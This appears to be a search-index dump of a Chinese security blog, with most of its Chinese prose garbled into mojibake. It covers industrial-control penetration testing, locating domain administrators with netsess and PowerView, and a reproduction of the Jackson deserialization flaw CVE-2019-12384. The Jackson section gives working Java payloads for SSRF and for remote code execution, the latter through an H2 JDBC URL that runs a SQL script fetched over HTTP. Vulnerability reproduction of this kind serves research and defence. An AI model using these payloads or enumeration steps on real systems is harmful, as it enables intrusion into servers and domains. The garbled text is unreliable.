FactoryTalk SE ç»„æ€ç›‘æ§è½¯ä»¶ Emulation æ¨¡æ‹Ÿä»¿çœŸè½¯ä»¶ ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:2:5","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Rockwell Automationâ€”â€”é€šè®¯åè®®åŠç«¯å£ Ethernet/IP(å…¬å¼€åè®®) é€šè®¯ç«¯å£ 44818/2222 ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:2:6","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"å·¥ä¸šæ§åˆ¶ç³»ç»Ÿè„†å¼±æ€§åˆ†æ ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:3:0","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"å·¥ä¸šæ§åˆ¶åè®®æ¼æ´ æ‰€ä½¿ç”¨çš„å·¥ä¸šæ§åˆ¶åè®®ç¼ºä¹èº«ä»½è®¤è¯ å·¥ä¸šæ§åˆ¶ç³»ç»Ÿæ‰€ä½¿ç”¨çš„åè®®ç¼ºä¹æˆæƒæœºåˆ¶ æ‰€ä½¿ç”¨çš„å·¥ä¸šæ§åˆ¶åè®®ç¼ºä¹åŠ å¯†ä¿æŠ¤ ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:3:1","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"PLC ä»£ç é€»è¾‘æ¼æ´ è®¡ç®—é€»è¾‘æ¼æ´ çœ‹é—¨å£è¶…æ—¶æ¼æ´ ç¼“å†²åŒºæº¢å‡ºæ¼æ´ ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:3:2","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"å·¥ä¸šä»¥å¤ªç½‘é“¾è·¯æ¼æ´ MACæ³›æ´ªæ”»å‡» ARPæº¢å‡º/ä¸­é—´äººæ”»å‡» ç¯ç½‘beaconåè®®æ”»å‡» VLANè·³è½¬æ”»å‡» äº¤æ¢æœºWEBæ¼æ´æ”»å‡» ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:3:3","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"ä¸»æœºå®‰å…¨æ¼æ´ é˜²ç«å¢™å…³é—­ æ²¡æœ‰æ€è½¯é˜²æŠ¤ ç¼ºä¹USBå‡†å…¥ Windowsæœ¬èº«æ¼æ´ SMB v1.0 Port 445 RDP Port 3389 AD åŸŸæ”»å‡» DNS æ±¡æŸ“æ”»å‡» ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:3:4","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"ç»„æ€è½¯ä»¶æ¼æ´ DoS æ‹’ç»æœåŠ¡æ”»å‡» ç¼“å†²åŒºæº¢å‡ºæ¼æ´ COM æœåŠ¡ç»„ä»¶æœªæˆæƒè®¿é—®æ¼æ´ SQL æ•°æ®åº“æ³¨å…¥æ¼æ´ ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:3:5","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"ç‰©ç†å®‰å…¨æ¼æ´ è®¾å¤‡æ‰€åœ¨åœ°æ— é˜²æŠ¤ æœºæˆ¿æœºæŸœæœªä¸Šé” ç½‘ç»œç«¯å£æœªåŠ å›º æ§åˆ¶å™¨é’¥åŒ™æœªæ‹”å‡º ä¾›ç”µç”µæºä¸ºå•è·¯ æ¥åœ°ç³»ç»Ÿä¸å®Œå–„ ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:3:6","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"å·¥ä¸šæ§åˆ¶ç³»ç»Ÿæ¸—é€å·¥å…·åˆ©ç”¨ ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:4:0","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Demo åœºæ™¯ ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:4:1","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"nmap æŒ‡çº¹æ‰«æ nmap -p port --script scada protocol ip address å‚è€ƒï¼šhttps://github.com/jianshting/NMAP-NSE-SCADA ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:4:2","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Yersinia äºŒå±‚ç½‘ç»œçš„æ”»å‡» Yersinia -G å‚è€ƒï¼šhttps://github.com/tomcat/yersinia ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:4:3","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Snap7 åè®®å±‚çš„æ”»å‡» s7 Client.exe ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:4:4","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"MSF ä¸»æœºæ”»å‡»å’Œåæ¸—é€ å¯¹PCä¸»æœºçš„æ¸—é€å’Œæ§åˆ¶(å’Œä¼ ç»Ÿå†…ç½‘æ¸—é€ä¸€æ ·) ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:4:5","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"ISF å·¥æ§æ¸—é€å·¥å…· å¼€æºçš„å·¥æ§æ¸—é€æ¡†æ¶ å‚è€ƒï¼šhttps://github.com/dark-lbp/isf ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:4:6","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"å·¥ä¸šæ§åˆ¶ç³»ç»Ÿå®‰å…¨é˜²å¾¡ ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:5:0","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"åŒºåŸŸè¾¹ç•Œ å·¥ä¸šé˜²ç«å¢™ã€åŒºåŸŸé˜²ç«å¢™ã€ç½‘é—¸ ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:5:1","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"ç½‘ç»œå®‰å…¨ äº¤æ¢æœºç©ºä½™ç«¯å£å…³é—­ã€native VLANã€ç¦ç”¨ CDP æˆ–ï¼šLLDPã€æ¡æ‰‹åŒ…æŠ¥æ–‡åŠ å¯† ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:5:2","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"ä¸»æœºå®‰å…¨ æ€è½¯ã€é˜²ç«å¢™ã€åŸºçº¿å®‰å…¨ã€Uå£å‡†å…¥ã€åº”ç”¨ç™½åå• ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:5:3","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"æ§åˆ¶å™¨å®‰å…¨ åè®®åŠ å¯†ã€æ³¨å…¥æ§åˆ¶ã€èº«ä»½è®¤è¯ ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:5:4","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"ç‰©ç†å®‰å…¨ æ¥åœ°å®‰å…¨ã€åŒè·¯ä¾›ç”µã€ç”µæŸœä¸Šé” ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:5:5","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åŸŸæ¸—é€ä¹‹å®šä½åŸŸç®¡ç†å‘˜","date":"2019-07-26","objectID":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å®šä½åŸŸç®¡ç†å‘˜","uri":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å®šä½åŸŸç®¡ç†å‘˜ ","date":"2019-07-26","objectID":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/:0:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å®šä½åŸŸç®¡ç†å‘˜","uri":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1 å®šä½åŸŸç®¡ä½ç½® å®šä½åŸŸç®¡ç†å‘˜ï¼Œç‰¹æƒè´¦æˆ·åœ¨åŸŸå†…å“ªäº›æœåŠ¡å™¨æˆ–ä¸»æœºä¸Šç™»å½•è¿‡ è·å¾—äº†é€šç”¨æœ¬åœ°å£ä»¤(Windows NT5.*ç³»ç»Ÿ)ï¼Œå®šä½ç‰¹æƒç”¨æˆ·ä»¥è·å–ç‰¹æƒç”¨æˆ·çš„ç™»å½•å‡­è¯ï¼Œä»è€Œè·å–åŸŸç®¡ç†å‘˜æƒé™ åœ¨ Vista ç³»ç»Ÿä¹‹åï¼Œå¯ä»¥ä½œä¸ºå®šå‘æ”»å‡»çš„ä¿¡æ¯æ¢æµ‹ ","date":"2019-07-26","objectID":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/:1:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å®šä½åŸŸç®¡ç†å‘˜","uri":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.1 åŸç† é€šè¿‡ IPC ç©ºè¿æ¥ã€æˆ–ä½æƒé™è¿æ¥ï¼Œè°ƒç”¨ç³»ç»Ÿ APIï¼Œæšä¸¾ç›®æ ‡ç³»ç»Ÿä¸­ä¼šè¯ä¿¡æ¯ã€ç™»å½•å†å²è®°å½•ã€ç»„ä¿¡æ¯åŠç»„æˆå‘˜ä¿¡æ¯ ","date":"2019-07-26","objectID":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/:2:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å®šä½åŸŸç®¡ç†å‘˜","uri":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.2 ç›¸å…³ API NetsessionEnum NetShareEnum NetWkstaUserEnum Active Diretory Service INterfaces [ADSI] Win NT provider ","date":"2019-07-26","objectID":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/:3:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å®šä½åŸŸç®¡ç†å‘˜","uri":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2 ç›¸å…³å·¥å…· Netsess.exe Netview.exe Pslogon.exe PVEFindADUser.exe ","date":"2019-07-26","objectID":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/:4:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å®šä½åŸŸç®¡ç†å‘˜","uri":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.1 netsess.exe é¦–å…ˆè¿›è¡Œ IPC è¿æ¥ï¼Œå¦åˆ™è¿”å›æ‹’ç»è¿æ¥ï¼Œé”™è¯¯ä»£ç ä¸º 5 è¿è¡Œ netsess.exe ","date":"2019-07-26","objectID":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/:4:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å®šä½åŸŸç®¡ç†å‘˜","uri":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.2 nete.exe ä¸‹è½½åœ°å€ nets.exe \\\\192.168.8.205 /0 ","date":"2019-07-26","objectID":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/:4:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å®šä½åŸŸç®¡ç†å‘˜","uri":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.3 Powershell ç»„ã€ç»„æˆå‘˜ä¿¡æ¯è·å–ï¼ŒADSI çš„ WinNT provider æ”¯æŒï¼Œå¯ä»¥é€šè¿‡ Powershell å¿«é€Ÿè·å–ä¿¡æ¯ Get-NetLocalGroup Get-NetLocalGroupMember -Computername [win10x64en] -GroupName [administrators] åœ¨ç®¡ç†å‘˜åœ¨åˆ¶å®šç»„ç­–ç•¥æ—¶ï¼Œå¯ä»¥å°†å½“å‰ç™»å½•çš„åŸŸç”¨æˆ·åŠ å…¥åˆ°æœ¬åœ°ç®¡ç†å‘˜ç»„ä¸­ ä¸»æœºç»„ç­–ç•¥å­˜æ”¾åœ¨$ GPOPath\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmp1.inf æ–‡ä»¶å’Œ $GPOPath\\MACHINE\\Preferences\\Groups\\Groups.xmlæ–‡ä»¶ä¸­ã€‚ åœ¨å®éªŒç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬æ·»åŠ äº†ä¸€ä¸ªåå« LocalAdmin çš„ç»„ç­–ç•¥ï¼Œå°† reduser ç”¨æˆ·æ·»åŠ åˆ°ç™»å½•ä¸»æœºçš„æœ¬åœ°ç®¡ç†å‘˜ç»„ PowerView æä¾›äº†ç±»ä¼¼çš„æ›´ä¸ºå¼ºå¤§çš„åŠŸèƒ½ï¼ŒGet-DomainGPOLocalGroup å‘½ä»¤ï¼Œæšä¸¾åˆ†ææ‰€æœ‰çš„ç»„ç­–ç•¥ï¼Œå¯æ–¹ä¾¿å¾—å‡ºç»“æœã€‚ Get-DomainGPOLocalGroup çš„åŸç†æ˜¯åˆ†æ GptTmp1.inf æ–‡ä»¶ä¸­æ˜¯å¦å­˜åœ¨ç‰¹æƒç»„çš„å˜åŠ¨ã€‚ ","date":"2019-07-26","objectID":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/:4:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å®šä½åŸŸç®¡ç†å‘˜","uri":"/2019/07/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/"},{"categories":["æ¼æ´å¤ç°"],"content":"CVE-2019-12384ï¼šJacksonååºåˆ—åŒ–æ¼æ´å¤ç°","date":"2019-07-26","objectID":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","tags":["Jackson-databind","æ¼æ´å¤ç°"],"title":"CVE-2019-12384ï¼šJacksonååºåˆ—åŒ–æ¼æ´å¤ç°","uri":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"CVE-2019-12384ï¼šJacksonååºåˆ—åŒ–æ¼æ´å¤ç° ","date":"2019-07-26","objectID":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:0","tags":["Jackson-databind","æ¼æ´å¤ç°"],"title":"CVE-2019-12384ï¼šJacksonååºåˆ—åŒ–æ¼æ´å¤ç°","uri":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"åˆ†æ æ ¹æ®Jacksonå¼€å‘è€…æåˆ°çš„ä¿¡æ¯ï¼Œè§¦å‘è¿™ä¸ªJacksonæ¼æ´éœ€è¦æ»¡è¶³å¦‚ä¸‹è¦æ±‚ï¼Œæ‰€ä»¥è¯¥æ¼æ´è¯„çº§ä¸ºä¸­å±ï¼š ç›®æ ‡åº”ç”¨æ¥æ”¶åˆ°ä¸å¯ä¿¡å®¢æˆ·ç«¯å‘é€çš„JSONæ•°æ® ç›®æ ‡åº”ç”¨ä½¿ç”¨å¤šæ€ç±»å‹å¤„ç†æ–¹å¼æ¥å¤„ç†java.lang.Objectç±»å‹çš„å±æ€§ï¼› ç›®æ ‡åº”ç”¨è‡³å°‘åŒ…å«èƒ½å¤Ÿåœ¨Java classpathä¸­åˆ©ç”¨çš„ä¸€ä¸ªâ€œgadgetâ€ç±»ã€‚åœ¨è¯¥æ¼æ´ä¸­å°±æ˜¯ä¾èµ–çš„ç¬¬ä¸‰æ–¹jaråŒ…æœ‰ç‚¹å¤šï¼Œé™¤å»jacksonè‡ªèº«çš„jaråŒ…ä»¥å¤–è¿˜éœ€è¦logback-coreå’Œh2ï¼› ","date":"2019-07-26","objectID":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:0","tags":["Jackson-databind","æ¼æ´å¤ç°"],"title":"CVE-2019-12384ï¼šJacksonååºåˆ—åŒ–æ¼æ´å¤ç°","uri":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"ç¯å¢ƒæ­å»º æœ¬æ–‡ä¸­ç”¨åˆ°çš„ç¬¬ä¸‰æ–¹åº“æœ‰ï¼š jackson-databind 2.9.8 jackson-annotations-2.9.8.jar jackson-core-2.9.8.jar logback-core-1.3.0-alpha4.jar h2 1.4.199 åœ¨http://www.mvnrepository.comä¸Šä¸‹è½½å³å¯ã€‚ ","date":"2019-07-26","objectID":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:0","tags":["Jackson-databind","æ¼æ´å¤ç°"],"title":"CVE-2019-12384ï¼šJacksonååºåˆ—åŒ–æ¼æ´å¤ç°","uri":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"æ¼æ´ä»£ç  package com.baiyang; import com.fasterxml.jackson.databind.ObjectMapper; import com.fasterxml.jackson.databind.SerializationFeature; import org.h2.Driver; public class Main { public static void main(String[] args) { try { Class.forName(\"org.h2.Driver\").newInstance(); } catch (Exception e) { e.printStackTrace(); } System.out.println(\"Mapping\"); //è¯¥æ¡payloadç”¨äºSSRFçš„å¤ç° String SSRF = \"[\\\"ch.qos.logback.core.db.DriverManagerConnectionSource\\\", {\\\"url\\\":\\\"jdbc:h2:tcp://127.0.0.1:4444/~/hacker\\\"}]\"; //è¯¥æ¡payloadç”¨äºRCEçš„å¤ç° String RCE = \"[\\\"ch.qos.logback.core.db.DriverManagerConnectionSource\\\", {\\\"url\\\":\\\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost/inject.sql'\\\"}]\"; ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false); System.out.println(\"Serializing\"); Object obj = null; try { //æ›´æ¢SSRFæˆ–RCEå³å¯æµ‹è¯•SSRFæˆ–è€…RCEæ¼æ´çš„payload obj = mapper.readValue(RCE, java.lang.Object.class); } catch(Exception e) { e.printStackTrace(); } System.out.println(\"objectified\"); try { System.out.println(\"stringified: \" + mapper.writeValueAsString(obj)); } catch(Exception e) { e.printStackTrace(); } } } 